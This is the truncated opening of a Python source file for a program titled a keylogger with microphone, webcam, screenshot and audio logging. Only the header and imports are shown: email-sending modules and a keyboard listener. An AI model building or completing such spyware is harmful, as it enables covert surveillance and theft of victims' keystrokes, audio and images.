"""
Program: KeyLogger (with Microphone, WebCamera, Screenshots, Audio Logging Feature)
Author: Sushilkumar Yadav
Date: 05/08/2022
"""

# Libraries
from email.mime.multipart import MIMEMultipart
from email import encoders
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wav
